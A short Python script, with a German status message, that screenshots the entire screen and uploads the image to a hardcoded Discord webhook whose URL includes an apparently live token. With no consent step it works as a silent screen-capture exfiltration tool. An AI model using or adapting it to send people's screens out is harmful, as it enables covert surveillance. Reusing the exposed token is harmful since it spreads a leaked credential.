import os
import time
import pyautogui
from discord_webhook import DiscordWebhook, DiscordEmbed

def take_screenshot():
    screenshot = pyautogui.screenshot()

    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)

    return screenshot_path

def send_to_discord(webhook_url, screenshot_path):
    webhook = DiscordWebhook(url=webhook_url)

    with open(screenshot_path, "rb") as file:
        webhook.add_file(file=file.read(), filename='screenshot.png')

    response = webhook.execute()

    print("Screenshot erfolgreich an Discord gesendet!")

if __name__ == "__main__":
    webhook_url = 'https://discord.com/api/webhooks/1180930073373712454/jkYAfKmaECvJeo9kK32Ln_5X-ucBoOStaoEs_Y6E7UpJqEXoXuno3YN-nwG1mlp7qp6O'

    screenshot_path = take_screenshot()

    send_to_discord(webhook_url, screenshot_path)